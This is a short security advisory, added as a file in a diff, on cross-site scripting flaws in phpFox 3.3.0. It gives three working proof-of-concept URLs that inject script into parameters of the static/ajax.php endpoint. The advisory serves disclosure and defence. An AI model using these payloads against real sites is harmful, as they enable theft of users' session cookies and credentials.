@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/55405/info
+
+phpFox is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+phpFox 3.3.0 is vulnerable; other versions may also be affected. 
+
+http://www.example.com//static/ajax.php?core[ajax]=true&core[call]=core.message&core[security_token]=860eb6a699d5d9f375b5e8cf0021c094&height=150&message="><script>alert(document.cookie);</script>&width=300
+
+http://www.example.com//static/ajax.php?comment_type_id=feed&core[ajax]=true&core[call]=comment.viewMoreFeed&core[is_admincp]=0&core[is_user_profile]=1&core[profile_user_id]=25&core[security_token]=1fa4d24158b81e721c5974d7f175b2ac&feed_id="><script>alert(document.cookie);</script>&item_id=518&_=1346525603467
+
+http://www.example.com//static/ajax.php?comment_type_id=feed&core[ajax]=true&core[call]=comment.viewMoreFeed&core[is_admincp]=0&core[is_user_profile]=1&core[profile_user_id]=25&core[security_token]=1fa4d24158b81e721c5974d7f175b2ac&feed_id=id&item_id=518"><script>alert(document.cookie);</script>&_=1346525603467
